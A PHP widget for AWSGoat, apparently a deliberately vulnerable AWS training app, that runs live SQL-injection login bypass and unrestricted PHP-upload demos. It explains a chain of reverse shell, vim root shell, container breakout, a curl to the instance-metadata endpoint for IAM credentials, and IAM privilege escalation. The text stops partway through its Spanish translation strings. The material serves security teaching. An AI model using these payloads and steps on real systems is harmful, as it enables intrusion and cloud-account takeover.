<?php
/**
 * Shared "Attack Demos" widget for AWSGoat Module 2 (AWS GOAT V2 - HR Portal).
 *
 * Include this file right before </body> on every page. Before including it,
 * set $attackDemoBase (relative path back to this src/ root, '' or '../')
 * and $attackDemoPage (an identifier used to decide which demos can run live
 * on the current page):
 *
 *   'login'               -> login.php
 *   'admin-payslips'      -> admin/payslips.php (Manager > Payslips upload)
 *   'admin-reimbursment'  -> admin/reimbursment.php (Manager > Reimbursements upload)
 *   'superadmin-payslips' -> superadmin/payslips.php (Admin > Payslips upload)
 *   'other'               -> everything else
 *
 * Only the SQL injection (login) and unrestricted file upload attacks are
 * wired up to actually run against the live app, since they are safe,
 * reversible, and don't touch the underlying AWS account. The ECS container
 * breakout and IAM privilege escalation attacks are explained but never
 * executed here, because they would hand real, permanent AWS access to
 * whoever clicked the button on this public demo.
 */

if (!isset($attackDemoBase)) {
    $attackDemoBase = '';
}
if (!isset($attackDemoPage)) {
    $attackDemoPage = 'other';
}
$attackDemoRole = isset($_SESSION['isadmin']) ? (int) $_SESSION['isadmin'] : null;
?>
<style>
    #attack-demo-toggle {
        position: fixed;
        bottom: 24px;
        right: 24px;
        z-index: 99998;
        background: #b91c1c;
        color: #fff;
        border: none;
        border-radius: 999px;
        padding: 14px 20px;
        font-weight: 700;
        font-size: 15px;
        box-shadow: 0 6px 18px rgba(0, 0, 0, 0.35);
        cursor: pointer;
    }
    #attack-demo-toggle:hover { background: #991b1b; }

    #defense-demo-toggle {
        position: fixed;
        bottom: 24px;
        left: 24px;
        z-index: 99998;
        background: #1d4ed8;
        color: #fff;
        border: none;
        border-radius: 999px;
        padding: 14px 20px;
        font-weight: 700;
        font-size: 15px;
        box-shadow: 0 6px 18px rgba(0, 0, 0, 0.35);
        cursor: pointer;
    }
    #defense-demo-toggle:hover { background: #1e40af; }

    #attack-demo-panel {
        position: fixed;
        top: 0;
        right: -420px;
        width: 400px;
        max-width: 92vw;
        height: 100%;
        background: #1c1c1c;
        color: #eee;
        z-index: 99999;
        box-shadow: -8px 0 24px rgba(0, 0, 0, 0.5);
        transition: right 0.25s ease;
        overflow-y: auto;
        font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
    }
    #attack-demo-panel.open { right: 0; }

    #defense-demo-panel {
        position: fixed;
        top: 0;
        left: -420px;
        width: 400px;
        max-width: 92vw;
        height: 100%;
        background: #0f172a;
        color: #e5e7eb;
        z-index: 99999;
        box-shadow: 8px 0 24px rgba(0, 0, 0, 0.5);
        transition: left 0.25s ease;
        overflow-y: auto;
        font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
    }
    #defense-demo-panel.open { left: 0; }

    #attack-demo-panel .adp-header {
        padding: 18px 20px;
        background: #b91c1c;
        position: sticky;
        top: 0;
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 10px;
    }
    #attack-demo-panel .adp-header h2 { margin: 0; font-size: 17px; }
    #defense-demo-panel .adp-header {
        padding: 18px 20px;
        background: #1d4ed8;
        position: sticky;
        top: 0;
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 10px;
    }
    #defense-demo-panel .adp-header h2 { margin: 0; font-size: 17px; }
    #attack-demo-panel .adp-header-right {
        display: flex;
        align-items: center;
        gap: 10px;
    }
    #attack-demo-panel .adp-lang-toggle {
        display: flex;
        border: 1px solid rgba(255,255,255,0.5);
        border-radius: 999px;
        overflow: hidden;
    }
    #attack-demo-panel .adp-lang-btn {
        background: transparent;
        color: #fff;
        border: none;
        padding: 3px 10px;
        font-size: 11px;
        font-weight: 700;
        cursor: pointer;
        opacity: 0.7;
    }
    #attack-demo-panel .adp-lang-btn.active {
        background: rgba(255,255,255,0.9);
        color: #b91c1c;
        opacity: 1;
    }
    #attack-demo-panel .adp-close {
        background: none;
        border: none;
        color: #fff;
        font-size: 22px;
        cursor: pointer;
        line-height: 1;
    }
    #defense-demo-panel .adp-close {
        background: none;
        border: none;
        color: #fff;
        font-size: 22px;
        cursor: pointer;
        line-height: 1;
    }
    #attack-demo-panel .adp-card {
        margin: 16px;
        padding: 14px 16px;
        background: #262626;
        border-radius: 10px;
        border: 1px solid #3a3a3a;
    }
    #defense-demo-panel .adp-card {
        margin: 16px;
        padding: 14px 16px;
        background: #111827;
        border-radius: 10px;
        border: 1px solid #334155;
    }
    #attack-demo-panel .adp-card h3 {
        margin: 0 0 4px;
        font-size: 15px;
    }
    #defense-demo-panel .adp-card h3 {
        margin: 0 0 4px;
        font-size: 15px;
    }
    #attack-demo-panel .adp-badge {
        display: inline-block;
        font-size: 10px;
        font-weight: 700;
        letter-spacing: 0.04em;
        padding: 2px 8px;
        border-radius: 999px;
        margin-bottom: 8px;
    }
    #attack-demo-panel .adp-badge.live { background: #16a34a; color: #04220f; }
    #attack-demo-panel .adp-badge.explainer { background: #4b5563; color: #f3f4f6; }
    #defense-demo-panel .adp-badge.live { background: #22c55e; color: #052e16; }
    #defense-demo-panel .adp-badge.explainer { background: #334155; color: #e2e8f0; }
    #attack-demo-panel p.adp-desc {
        font-size: 13px;
        line-height: 1.45;
        color: #cfcfcf;
        margin: 6px 0 10px;
    }
    #defense-demo-panel p.adp-desc {
        font-size: 13px;
        line-height: 1.45;
        color: #cbd5e1;
        margin: 6px 0 10px;
    }
    #attack-demo-panel code.adp-payload {
        display: block;
        background: #111;
        color: #7ee787;
        padding: 6px 8px;
        border-radius: 6px;
        font-size: 12px;
        margin: 4px 0 10px;
        word-break: break-all;
    }
    #defense-demo-panel code.adp-payload {
        display: block;
        background: #020617;
        color: #93c5fd;
        padding: 6px 8px;
        border-radius: 6px;
        font-size: 12px;
        margin: 4px 0 10px;
        word-break: break-all;
    }
    #attack-demo-panel .adp-btn {
        display: inline-block;
        background: #dc2626;
        color: #fff;
        border: none;
        border-radius: 6px;
        padding: 7px 12px;
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
        margin: 3px 4px 3px 0;
        text-decoration: none;
    }
    #attack-demo-panel .adp-btn:hover { background: #b91c1c; }
    #defense-demo-panel .adp-btn {
        display: inline-block;
        background: #2563eb;
        color: #fff;
        border: none;
        border-radius: 6px;
        padding: 7px 12px;
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
        margin: 3px 4px 3px 0;
        text-decoration: none;
    }
    #defense-demo-panel .adp-btn:hover { background: #1d4ed8; }
    #attack-demo-panel .adp-btn.secondary {
        background: #374151;
    }
    #attack-demo-panel .adp-btn.secondary:hover { background: #1f2937; }
    #defense-demo-panel .adp-btn.secondary {
        background: #334155;
    }
    #defense-demo-panel .adp-btn.secondary:hover { background: #1e293b; }
    #attack-demo-panel .adp-note {
        font-size: 12px;
        color: #9ca3af;
        margin-top: 6px;
    }
    /* Improve readability for the ECS breakout card guidance + sudo output. */
    #attack-demo-panel .adp-note.c3-readable {
        font-size: 13px;
        line-height: 1.55;
        color: #e5e7eb;
        background: #1f2937;
        border-left: 3px solid #60a5fa;
        border-radius: 6px;
        padding: 9px 10px;
    }
    #adp-sudo-check-result {
        background: #030712 !important;
        color: #f8fafc !important;
        border: 1px solid #334155;
        padding: 10px 12px;
        border-radius: 8px;
        font-size: 12.5px;
        line-height: 1.45;
        max-height: 240px;
        overflow: auto;
        white-space: pre-wrap !important;
        word-break: break-word;
    }
    #defense-demo-panel .adp-note {
        font-size: 12px;
        color: #94a3b8;
        margin-top: 6px;
    }
    #attack-demo-panel details summary {
        cursor: pointer;
        font-size: 13px;
        color: #f3f4f6;
        margin-top: 4px;
    }
    #attack-demo-panel details ol,
    #attack-demo-panel details ul {
        font-size: 12.5px;
        color: #cfcfcf;
        padding-left: 18px;
        line-height: 1.5;
    }
    #attack-demo-toast {
        position: fixed;
        bottom: 90px;
        right: 24px;
        max-width: 360px;
        background: #16a34a;
        color: #04220f;
        padding: 12px 16px;
        border-radius: 8px;
        font-size: 13px;
        font-weight: 600;
        box-shadow: 0 6px 18px rgba(0, 0, 0, 0.35);
        z-index: 99999;
        display: none;
    }
    #attack-demo-toast a { color: #04220f; }

    /* Mobile sidebar toggle: injected by JS to open the HR portal's own
       fixed sidebar nav, which has no way to open on small screens otherwise. */
    #adp-mobile-nav-toggle {
        display: none;
        background: rgba(255, 255, 255, 0.45);
        border: 1px solid rgba(0, 48, 99, 0.35);
        border-radius: 8px;
        padding: 6px 8px;
        margin-right: 4px;
        cursor: pointer;
        vertical-align: middle;
    }
    #adp-mobile-nav-toggle .navbar-toggler-icon {
        display: inline-block;
        width: 1.5em;
        height: 1.5em;
        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='rgba(0,0,0,0.75)' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e");
        background-repeat: no-repeat;
        background-position: center;
        background-size: 100%;
    }
    #adp-mobile-nav-backdrop {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.45);
        z-index: 45;
        display: none;
    }
    #adp-mobile-nav-backdrop.open { display: block; }

    @media (max-width: 991.98px) {
        #adp-mobile-nav-toggle { display: inline-block; }
        #sidebarMenu.collapse:not(.show) { display: block !important; }
        #sidebarMenu {
            position: fixed;
            top: 70px;
            left: 0;
            height: calc(100dvh - 70px);
            z-index: 50;
        }
        #sidebarMenu .navlinks {
            top: 0;
            bottom: auto;
            height: 100%;
            width: min(84vw, 320px) !important;
            overflow-y: auto;
            pointer-events: none;
            transform: translateX(-105%);
            transition: transform 0.25s ease;
            z-index: 50;
        }
        #sidebarMenu.show .navlinks {
            transform: translateX(0);
            pointer-events: auto;
        }
    }

    /* Mobile-friendly attack demo panel: a bottom sheet with a backdrop,
       a drag handle, and a bigger close target instead of the desktop
       side-drawer with only a small "x" button. */
    .adp-drag-handle {
        display: none;
        width: 42px;
        height: 5px;
        border-radius: 999px;
        background: rgba(255, 255, 255, 0.35);
        margin: 10px auto 0;
    }
    #attack-demo-backdrop {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.5);
        z-index: 99997;
        display: none;
    }
    #attack-demo-backdrop.open { display: block; }
    #defense-demo-backdrop {
        position: fixed;
        inset: 0;
        background: rgba(2, 6, 23, 0.55);
        z-index: 99997;
        display: none;
    }
    #defense-demo-backdrop.open { display: block; }

    @media (max-width: 600px) {
        #attack-demo-panel {
            top: auto;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            max-width: 100%;
            height: 88vh;
            max-height: 88vh;
            border-radius: 16px 16px 0 0;
            transform: translateY(100%);
            transition: transform 0.28s ease;
        }
        #attack-demo-panel.open { transform: translateY(0); }
        #defense-demo-panel {
            top: auto;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            max-width: 100%;
            height: 88vh;
            max-height: 88vh;
            border-radius: 16px 16px 0 0;
            transform: translateY(100%);
            transition: transform 0.28s ease;
        }
        #defense-demo-panel.open { transform: translateY(0); }
        #attack-demo-panel .adp-drag-handle { display: block; }
        #attack-demo-toggle {
            bottom: 18px;
            right: 14px;
            padding: 12px 16px;
            font-size: 13px;
            max-width: 46vw;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
        }
        #defense-demo-toggle {
            bottom: 74px;
            right: 14px;
            left: auto;
            padding: 12px 16px;
            font-size: 13px;
            max-width: 46vw;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
        }
        #attack-demo-panel .adp-close {
            font-size: 26px;
            padding: 8px 10px;
            min-width: 44px;
            min-height: 44px;
        }
        #adp-sudo-check-result {
            max-height: 190px;
            font-size: 12px;
        }
        #defense-demo-panel .adp-close {
            font-size: 26px;
            padding: 8px 10px;
            min-width: 44px;
            min-height: 44px;
        }
    }
</style>

<button id="attack-demo-toggle" type="button" onclick="AttackDemo.togglePanel()" data-i18n="toggle.label">⚔ Attack Demos</button>
<button id="defense-demo-toggle" type="button" onclick="AttackDemo.toggleDefensePanel()" data-i18n="defense.toggle.label">🛡 Defense Demos</button>

<div id="attack-demo-panel">
    <div class="adp-drag-handle" aria-hidden="true"></div>
    <div class="adp-header">
        <h2 data-i18n="panel.title">⚔ AWSGoat Attack Demos</h2>
        <div class="adp-header-right">
            <div class="adp-lang-toggle">
                <button class="adp-lang-btn" type="button" data-lang="en" onclick="AttackDemo.setLanguage('en')">EN</button>
                <button class="adp-lang-btn" type="button" data-lang="es" onclick="AttackDemo.setLanguage('es')">ES</button>
            </div>
            <button class="adp-close" type="button" onclick="AttackDemo.togglePanel()">&times;</button>
        </div>
    </div>

    <div class="adp-card">
        <span class="adp-badge live" data-i18n="badge.live">LIVE DEMO</span>
        <h3 data-i18n="c1.title">1. SQL Injection &mdash; Login Bypass</h3>
        <p class="adp-desc" data-i18n-html="c1.desc">
            The login query builds SQL by directly concatenating the <code>email</code> field.
            Ending the input with <code>#</code> comments out the password check, and
            <code>LIMIT</code>/<code>ORDER BY</code> control which account you're logged in as.
        </p>
        <code class="adp-payload" id="adp-sqli-payload">email = ' or '1'='1'#</code>
        <div>
            <button class="adp-btn" type="button" data-i18n="c1.btnBypass" onclick="AttackDemo.goRunSqli('bypass')">Run: Bypass Login</button>
            <button class="adp-btn" type="button" data-i18n="c1.btnManager" onclick="AttackDemo.goRunSqli('manager')">Run: Login as Manager</button>
            <button class="adp-btn" type="button" data-i18n="c1.btnAdmin" onclick="AttackDemo.goRunSqli('admin')">Run: Login as Admin</button>
        </div>
        <p class="adp-note" data-i18n-html="c1.note">Safe &amp; reversible &mdash; it only signs you in as a demo account. Use Logout to reset.</p>
    </div>

    <div class="adp-card">
        <span class="adp-badge live" data-i18n="badge.live">LIVE DEMO</span>
        <h3 data-i18n="c2.title">2. Unrestricted File Upload</h3>
        <p class="adp-desc" data-i18n-html="c2.desc">
            The Manager/Admin payslip &amp; reimbursement uploads never check file type, unlike the
            Normal User upload which only allows PDF/JPEG/PNG. This demo uploads a harmless
            <code>.php</code> proof-of-concept (no shell, no network access) to prove the server
            will happily store and execute server-side code here.
        </p>
        <?php if ($attackDemoPage === 'admin-payslips' || $attackDemoPage === 'admin-reimbursment' || $attackDemoPage === 'superadmin-payslips') { ?>
            <button class="adp-btn" type="button" data-i18n="c2.btnUpload" onclick="AttackDemo.runUploadDemo()">Run: Upload PHP proof-of-concept</button>
            <p class="adp-note" data-i18n="c2.noteAfterUpload">After it uploads, a link to view the executed file will appear here.</p>
        <?php } elseif ($attackDemoRole === 1) { ?>
            <a class="adp-btn" data-i18n="c2.linkManager" href="<?php echo htmlspecialchars($attackDemoBase); ?>admin/payslips.php">Go to Manager Payslips &rarr;</a>
        <?php } elseif ($attackDemoRole === 2) { ?>
            <a class="adp-btn" data-i18n="c2.linkAdmin" href="<?php echo htmlspecialchars($attackDemoBase); ?>superadmin/payslips.php">Go to Admin Payslips &rarr;</a>
        <?php } else { ?>
            <p class="adp-note" data-i18n="c2.noteLoginFirst">Log in as a Manager or Admin first (use the SQL injection demo above), then come back to this menu on their Payslips page.</p>
        <?php } ?>
        <details>
            <summary data-i18n="c2.summary">Where does this attack lead next? (not run here)</summary>
            <ol>
                <li data-i18n-html="c2.li1">A real attacker uploads a PHP <em>reverse shell</em> instead of a harmless file.</li>
                <li data-i18n-html="c2.li2">Opening "View File" executes it, handing the attacker a shell on the ECS container.</li>
                <li data-i18n-html="c2.li3">From there: container breakout via a misconfigured <code>sudo</code> rule + the
                    <code>SYS_PTRACE</code> capability, then reading the EC2/ECS instance metadata
                    service for real IAM credentials.</li>
            </ol>
            <p class="adp-note" data-i18n-html="c2.detailsNote">This chain grants real, persistent access to your AWS account, so it is intentionally never executed from this button. See "ECS Container Breakout" below.</p>
        </details>
    </div>

    <div class="adp-card">
        <span class="adp-badge live" data-i18n="badge.live">LIVE DEMO</span>
        <span class="adp-badge explainer" data-i18n="badge.explainerBeyond">EXPLAINER BEYOND THIS POINT</span>
        <h3 data-i18n="c3.title">3. ECS Container Breakout</h3>
        <p class="adp-desc" data-i18n-html="c3.sudoCheckIntro">
            This calls the PHP file uploaded in attack #2 and runs a real, read-only
            <code>sudo -l</code> on the container, to prove the misconfigured rule below
            actually exists instead of just describing it.
        </p>
        <button class="adp-btn" type="button" data-i18n="c3.btnSudoCheck" onclick="AttackDemo.runSudoCheckDemo()">Run: Check sudo Misconfiguration</button>
        <p class="adp-note c3-readable" data-i18n="c3.noteNeedsUpload">Run the file upload demo above first (attack #2) so there's an uploaded PHP file to check this from.</p>
        <pre class="adp-payload" id="adp-sudo-check-result" style="display:none; white-space: pre-wrap;"></pre>
        <p class="adp-note c3-readable" data-i18n-html="c3.beyondNote">Everything below is real and exploitable on this container, but intentionally stops here: continuing would spawn an actual root shell, break out to the host, and expose real, temporary AWS credentials for this EC2 instance to whoever clicked the button.</p>
        <details>
            <summary data-i18n="howItWorks.summary">How it works</summary>
            <ol>
                <li data-i18n-html="c3.li1">From the reverse shell (see attack #2), the attacker is a low-privilege
                    <code>www-data</code> user with no access to <code>/root</code> or the
                    instance metadata endpoint.</li>
                <li data-i18n-html="c3.li2"><code>sudo -l</code> reveals they can run <code>vim</code> as root with no
                    password &mdash; vim's <code>:! /bin/sh</code> command spawns a root shell.</li>
                <li data-i18n-html="c3.li3">As root, the container's <code>SYS_PTRACE</code> capability lets it inject
                    shellcode into a root-owned process on the <em>host</em> instance, breaking
                    out of the container entirely.</li>
                <li data-i18n-html="c3.li4">From the host, <code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code>
                    returns real, temporary AWS credentials for the EC2 instance role.</li>
            </ol>
        </details>
    </div>

    <div class="adp-card">
        <span class="adp-badge explainer" data-i18n="badge.explainer">EXPLAINER ONLY</span>
        <h3 data-i18n="c4.title">4. IAM Privilege Escalation</h3>
        <p class="adp-desc" data-i18n="c4.desc">
            Not executed here: this would create a real, permanent IAM admin user on the live
            AWS account for anyone who clicked the button.
        </p>
        <details>
            <summary data-i18n="howItWorks.summary">How it works</summary>
            <ol>
                <li data-i18n-html="c4.li1">Using the instance credentials from attack #3, the attacker lists their own
                    role's policies and finds broad IAM permissions, but a permissions boundary
                    blocks direct privilege escalation (e.g. <code>iam:CreateUser</code> is denied).</li>
                <li data-i18n-html="c4.li2">The boundary still allows <code>iam:PassRole</code>, <code>ec2:RunInstances</code>
                    and <code>ssm:SendCommand</code>. The attacker finds another IAM role with an
                    unrestricted admin policy attached.</li>
                <li data-i18n-html="c4.li3">They launch a new EC2 instance and pass it that more-privileged role, then use
                    SSM to run a command on it and read its instance-metadata credentials.</li>
                <li data-i18n-html="c4.li4">With those unrestricted credentials, they create a new IAM user, attach
                    <code>AdministratorAccess</code>, and now own the AWS account.</li>
            </ol>
        </details>
    </div>
</div>

<div id="defense-demo-panel">
    <div class="adp-header">
        <h2 data-i18n="defense.panel.title">🛡 Blue Team Runtime Defense</h2>
        <div class="adp-header-right">
            <button class="adp-close" type="button" onclick="AttackDemo.toggleDefensePanel()">&times;</button>
        </div>
    </div>

    <div class="adp-card">
        <span class="adp-badge live" data-i18n="badge.live">LIVE DEMO</span>
        <h3 data-i18n="defense.c1.title">1. Kernel Blocking (Tetragon)</h3>
        <p class="adp-desc" data-i18n-html="defense.c1.desc">This is the blue-team side of the same scenario: malicious syscalls are blocked in-kernel while the app keeps serving users.</p>
        <code class="adp-payload" data-i18n="defense.c1.cmd1">./modules/module-2/runtime-defense-live-check.sh</code>
        <button class="adp-btn secondary" type="button" onclick="AttackDemo.copyDefenseCommand('./modules/module-2/runtime-defense-live-check.sh')" data-i18n="defense.copyBtn">Copy Command</button>
        <p class="adp-note" data-i18n="defense.c1.note">Run from your local repo terminal before going live.</p>
    </div>

    <div class="adp-card">
        <span class="adp-badge explainer" data-i18n="badge.explainer">EXPLAINER ONLY</span>
        <h3 data-i18n="defense.c2.title">2. Live Talk Flow (Blue Terminal)</h3>
        <p class="adp-desc" data-i18n="defense.c2.desc">Keep one terminal streaming Tetragon events while the red-team actions run.</p>
        <code class="adp-payload">aws ssm start-session --target i-0f0d60766006a7901 --region us-east-1</code>
        <code class="adp-payload">sudo docker exec -it tetragon tetra getevents -o compact</code>
        <p class="adp-note" data-i18n="defense.c2.note">When red-team triggers an attack, this terminal shows kernel-level enforcement in real time.</p>
    </div>
</div>

<div id="attack-demo-backdrop" onclick="AttackDemo.closePanel()"></div>
<div id="defense-demo-backdrop" onclick="AttackDemo.closeDefensePanel()"></div>

<div id="attack-demo-toast"></div>

<script>
    window.AttackDemo = (function () {
        var ctx = {
            base: <?php echo json_encode($attackDemoBase); ?>,
            page: <?php echo json_encode($attackDemoPage); ?>,
        };

        var I18N = {
            en: {
                'toggle.label': '⚔ Attack Demos',
                'defense.toggle.label': '🛡 Defense Demos',
                'panel.title': '⚔ AWSGoat Attack Demos',
                'defense.panel.title': '🛡 Blue Team Runtime Defense',
                'badge.live': 'LIVE DEMO',
                'badge.explainer': 'EXPLAINER ONLY',
                'defense.c1.title': '1. Kernel Blocking (Tetragon)',
                'defense.c1.desc': 'This is the blue-team side of the same scenario: malicious syscalls are blocked in-kernel while the app keeps serving users.',
                'defense.c1.cmd1': './modules/module-2/runtime-defense-live-check.sh',
                'defense.copyBtn': 'Copy Command',
                'defense.c1.note': 'Run from your local repo terminal before going live.',
                'defense.c2.title': '2. Live Talk Flow (Blue Terminal)',
                'defense.c2.desc': 'Keep one terminal streaming Tetragon events while the red-team actions run.',
                'defense.c2.note': 'When red-team triggers an attack, this terminal shows kernel-level enforcement in real time.',
                'c1.title': '1. SQL Injection \u2014 Login Bypass',
                'c1.desc': 'The login query builds SQL by directly concatenating the <code>email</code> field. Ending the input with <code>#</code> comments out the password check, and <code>LIMIT</code>/<code>ORDER BY</code> control which account you\'re logged in as.',
                'c1.btnBypass': 'Run: Bypass Login',
                'c1.btnManager': 'Run: Login as Manager',
                'c1.btnAdmin': 'Run: Login as Admin',
                'c1.note': 'Safe &amp; reversible \u2014 it only signs you in as a demo account. Use Logout to reset.',
                'c2.title': '2. Unrestricted File Upload',
                'c2.desc': 'The Manager/Admin payslip &amp; reimbursement uploads never check file type, unlike the Normal User upload which only allows PDF/JPEG/PNG. This demo uploads a harmless <code>.php</code> proof-of-concept (no shell, no network access) to prove the server will happily store and execute server-side code here.',
                'c2.btnUpload': 'Run: Upload PHP proof-of-concept',
                'c2.noteAfterUpload': 'After it uploads, a link to view the executed file will appear here.',
                'c2.linkManager': 'Go to Manager Payslips \u2192',
                'c2.linkAdmin': 'Go to Admin Payslips \u2192',
                'c2.noteLoginFirst': 'Log in as a Manager or Admin first (use the SQL injection demo above), then come back to this menu on their Payslips page.',
                'c2.summary': 'Where does this attack lead next? (not run here)',
                'c2.li1': 'A real attacker uploads a PHP <em>reverse shell</em> instead of a harmless file.',
                'c2.li2': 'Opening "View File" executes it, handing the attacker a shell on the ECS container.',
                'c2.li3': 'From there: container breakout via a misconfigured <code>sudo</code> rule + the <code>SYS_PTRACE</code> capability, then reading the EC2/ECS instance metadata service for real IAM credentials.',
                'c2.detailsNote': 'This chain grants real, persistent access to your AWS account, so it is intentionally never executed from this button. See "ECS Container Breakout" below.',
                'c3.title': '3. ECS Container Breakout',
                'badge.explainerBeyond': 'EXPLAINER BEYOND THIS POINT',
                'c3.sudoCheckIntro': 'This calls the PHP file uploaded in attack #2 and runs a real, read-only <code>sudo -l</code> on the container, to prove the misconfigured rule below actually exists instead of just describing it.',
                'c3.btnSudoCheck': 'Run: Check sudo Misconfiguration',
                'c3.noteNeedsUpload': 'Run the file upload demo above first (attack #2) so there\'s an uploaded PHP file to check this from.',
                'c3.beyondNote': 'Everything below is real and exploitable on this container, but intentionally stops here: continuing would spawn an actual root shell, break out to the host, and expose real, temporary AWS credentials for this EC2 instance to whoever clicked the button.',
                'toast.sudoCheckNeedsUpload': 'Run the "Upload PHP proof-of-concept" demo above first (attack #2), then try this again.',
                'howItWorks.summary': 'How it works',
                'c3.li1': 'From the reverse shell (see attack #2), the attacker is a low-privilege <code>www-data</code> user with no access to <code>/root</code> or the instance metadata endpoint.',
                'c3.li2': '<code>sudo -l</code> reveals they can run <code>vim</code> as root with no password &mdash; vim\'s <code>:! /bin/sh</code> command spawns a root shell.',
                'c3.li3': 'As root, the container\'s <code>SYS_PTRACE</code> capability lets it inject shellcode into a root-owned process on the <em>host</em> instance, breaking out of the container entirely.',
                'c3.li4': 'From the host, <code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> returns real, temporary AWS credentials for the EC2 instance role.',
                'c4.title': '4. IAM Privilege Escalation',
                'c4.desc': 'Not executed here: this would create a real, permanent IAM admin user on the live AWS account for anyone who clicked the button.',
                'c4.li1': 'Using the instance credentials from attack #3, the attacker lists their own role\'s policies and finds broad IAM permissions, but a permissions boundary blocks direct privilege escalation (e.g. <code>iam:CreateUser</code> is denied).',
                'c4.li2': 'The boundary still allows <code>iam:PassRole</code>, <code>ec2:RunInstances</code> and <code>ssm:SendCommand</code>. The attacker finds another IAM role with an unrestricted admin policy attached.',
                'c4.li3': 'They launch a new EC2 instance and pass it that more-privileged role, then use SSM to run a command on it and read its instance-metadata credentials.',
                'c4.li4': 'With those unrestricted credentials, they create a new IAM user, attach <code>AdministratorAccess</code>, and now own the AWS account.',
                'toast.uploadSuccess': 'Upload succeeded: the .php proof-of-concept was accepted with no type check.',
                'toast.viewFileLink': 'View the executed file',
                'toast.prefilledSubmitNow': 'Form prefilled. Click Upload/Apply now to run the demo.',
                'toast.manualUploadNeeded': "Your browser blocked auto-attaching the file. The PoC file was downloaded \u2014 tap \"Choose File\" below, pick attack-demo-poc.php, then press Upload/Apply yourself.",
                'toast.demoError': 'Demo error: ',
            },
            es: {
                'toggle.label': '⚔ Demos de Ataques',
                'defense.toggle.label': '🛡 Demos de Defensa',
                'panel.title': '⚔ Demos de Ataques AWSGoat',
                'defense.panel.title': '🛡 Defensa Blue Team en Runtime',
                'badge.live': 'DEMO EN VIVO',
                'badge.explainer': 'SOLO EXPLICACI\u00d3N',
                'defense.c1.title': '1. Bloqueo a Nivel Kernel (Tetragon)',
                'defense.c1.desc': 'Este es el lado blue-team del mismo escenario: las syscalls maliciosas se bloquean en el kernel mientras la app sigue atendiendo usuarios.',
                'defense.c1.cmd1': './modules/module-2/runtime-defense-live-check.sh',
                'defense.copyBtn': 'Copiar Comando',
                'defense.c1.note': 'Ejecútalo desde tu terminal local del repo antes de salir en vivo.',
                'defense.c2.title': '2. Flujo en Vivo (Terminal Blue)',
                'defense.c2.desc': 'Mantén una terminal transmitiendo eventos de Tetragon mientras corren las acciones red-team.',
                'defense.c2.note': 'Cuando red-team lance un ataque, esta terminal muestra la aplicación del kernel en tiempo real.',
                'c1.title': '1. Inyecci\u00f3n SQL \u2014 Bypass de Login',
                'c1.desc': 'La consulta de login construye el SQL concatenando directamente el campo <code>email</code>. Terminar la entrada con <code>#</code> comenta la verificaci\u00f3n de contrase\u00f1a, y <code>LIMIT</code>/<code>ORDER BY</code> controlan con qu\u00e9 cuenta inicias sesi\u00f3n.',
                'c1.btnBypass': 'Ejecutar: Bypass de Login',
                'c1.btnManager': 'Ejecutar: Iniciar como Gerente',
                'c1.btnAdmin': 'Ejecutar: Iniciar como Admin',
                'c1.note': 'Seguro y reversible \u2014 solo inicia sesi\u00f3n con una cuenta de demostraci\u00f3n. Usa Cerrar sesi\u00f3n para reiniciar.',
                'c2.title': '2. Carga de Archivos sin Restricciones',
                'c2.desc': 'Las cargas de recibos de pago y reembolsos de Gerente/Admin nunca verifican el tipo de archivo, a diferencia de la carga de Usuario Normal que solo permite PDF/JPEG/PNG. Esta demo carga una prueba de concepto <code>.php</code> inofensiva (sin shell, sin acceso a red) para demostrar que el servidor almacenar\u00e1 y ejecutar\u00e1 c\u00f3digo del lado del servidor sin problema.',
                'c2.btnUpload': 'Ejecutar: Subir prueba de concepto PHP',
                'c2.noteAfterUpload': 'Despu\u00e9s de subirlo, aparecer\u00e1 aqu\u00ed un enlace para ver el archivo ejecutado.',
                'c2.linkManager': 'Ir a Recibos de Pago del Gerente \u2192',
                'c2.linkAdmin': 'Ir a Recibos de Pago del Admin \u2192',
                'c2.noteLoginFirst': 'Primero inicia sesi\u00f3n como Gerente o Admin (usa la demo de inyecci\u00f3n SQL arriba), y luego vuelve a este men\u00fa en su p\u00e1gina de Recibos de Pago.',
                'c2.summary': '\u00bfA d\u00f3nde lleva este ataque despu\u00e9s? (no se ejecuta aqu\u00ed)',
                'c2.li1': 'Un atacante real sube una <em>reverse shell</em> en PHP en lugar de un archivo inofensivo.',
                'c2.li2': 'Abrir "View File" la ejecuta, d\u00e1ndole al atacante una shell en el contenedor ECS.',
                'c2.li3': 'Desde ah\u00ed: escape del contenedor mediante una regla de <code>sudo</code> mal configurada + la capacidad <code>SYS_PTRACE</code>, y luego lectura del servicio de metadatos de la instancia EC2/ECS para obtener credenciales IAM reales.',
                'c2.detailsNote': 'Esta cadena otorga acceso real y persistente a tu cuenta de AWS, por lo que intencionalmente nunca se ejecuta desde este bot\u00f3n. Ver "ECS Container Breakout" abajo.',
                'c3.title': '3. Escape de Contenedor ECS',
                'badge.explainerBeyond': 'EXPLICACI\u00d3N A PARTIR DE AQU\u00cd',
                'c3.sudoCheckIntro': 'Esto llama al archivo PHP subido en el ataque #2 y ejecuta un <code>sudo -l</code> real y de solo lectura en el contenedor, para probar que la regla mal configurada de abajo realmente existe en lugar de solo describirla.',
                'c3.btnSudoCheck': 'Ejecutar: Verificar Mala Configuraci\u00f3n de sudo',
                'c3.noteNeedsUpload': 'Primero ejecuta la demo de carga de archivos arriba (ataque #2) para tener un archivo PHP subido desde el cual verificar esto.',
